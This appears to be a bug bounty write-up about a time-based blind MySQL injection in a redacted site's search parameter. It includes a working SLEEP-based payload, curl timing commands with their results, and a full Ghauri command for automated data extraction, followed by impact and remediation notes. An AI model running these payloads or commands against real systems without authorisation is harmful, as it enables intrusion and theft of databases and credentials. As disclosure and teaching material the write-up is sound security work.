---
title: "Time-Based Blind SQL Injection: Confirming and Exploiting with curl and Ghauri"
author: Bahmed Boumriga
url: https://medium.com/@boumriga.bahmed/time-based-blind-sql-injection-confirming-and-exploiting-with-curl-and-ghauri-3c7bf94aaffd
date_published: 2026-06-20
date_scraped: 2026-11-19
platform: medium
disclosed_report: none (active HackerOne program, target redacted)
bounty: not stated
vuln_class: sqli
---

<!-- Raw scraped text below. Public (not member-only). Full content captured. HackerOne bug bounty writeup, target redacted. -->

# Time-based blind SQLi: curl confirmation then ghauri (MySQL)

Target: a search `?s=` GET parameter passed unsanitized into a MySQL query. Type: time-based blind. DBMS: MySQL. Severity: Critical. Unauthenticated.

## The payload
```
'XOR(if(now()=sysdate(),SLEEP(N),0))XOR'Z
```
- `now()=sysdate()` is almost always TRUE in MySQL (both return the current timestamp), so `SLEEP(N)` runs.
- `SLEEP(N)` pauses N seconds.
- The `XOR` wrappers fix the syntax context so the payload fits the original query; the trailing `Z` closes the string.

## Step 1: manual confirmation with curl (measure the delay)
Baseline (no injection):
```
time curl -o /dev/null -s "https://[REDACTED]/"     -> ~0.5s
```
Injected (scaling delays):
```
?s='XOR(if(now()=sysdate(),SLEEP(5),0))XOR'Z   -> ~5.3s
?s='XOR(if(now()=sysdate(),SLEEP(10),0))XOR'Z  -> ~10.3s
?s='XOR(if(now()=sysdate(),SLEEP(15),0))XOR'Z  -> ~15.3s
```
A **consistent, linearly scaling** delay (not a single slow response) is definitive proof: the injected SQL is executing. One delayed response could be network noise; proportional delays across multiple sleep values are conclusive.

## Step 2: automated exploitation with Ghauri
Ghauri (github.com/r0oth3x49/ghauri) is an open-source SQLi tool, strong for time-based blind on unstable / WAF-protected targets (better timing control and retry logic than sqlmap for this case):
```
ghauri -u "https://[REDACTED]/?s=test" --dbms mysql --technique T \
  --banner --batch --level 3 --confirm --retries 10 --flush-session \
  --time-sec 20 --delay 20
```
Flags: `--technique T` (time-based), `--banner`/`--current-db`/`--current-user`/`--hostname` to extract, `--time-sec` seconds to delay the DB response, `--delay` seconds between requests (raise both on slow/WAF targets to avoid false negatives and read timeouts). Retrieved: MySQL banner, hostname, current database, current user.

## Impact
Unauthenticated attacker can: extract schema/tables/columns/rows by blind inference, enumerate DB users/privileges, map infrastructure (hostname, version), dump all data (credentials, PII, tokens) given enough requests, possibly bypass login, and escalate to full compromise if the DB user has `FILE` privileges (read/write server files).

## Remediation
Parameterized queries / prepared statements (primary), ORM, input validation/allowlisting, least-privilege DB user (no `FILE`/`SUPER`/`GRANT`), WAF (secondary), never expose DB errors in production.

## Key takeaways
- Always start manual (curl) before automated tools; it makes the report credible.
- Timing consistency matters: linearly scaling delays across sleep values are conclusive, a single delay is not.
- Ghauri is strong for time-based blind when sqlmap struggles on unstable targets.
- High `--time-sec`/`--delay` needed on slow/WAF targets.
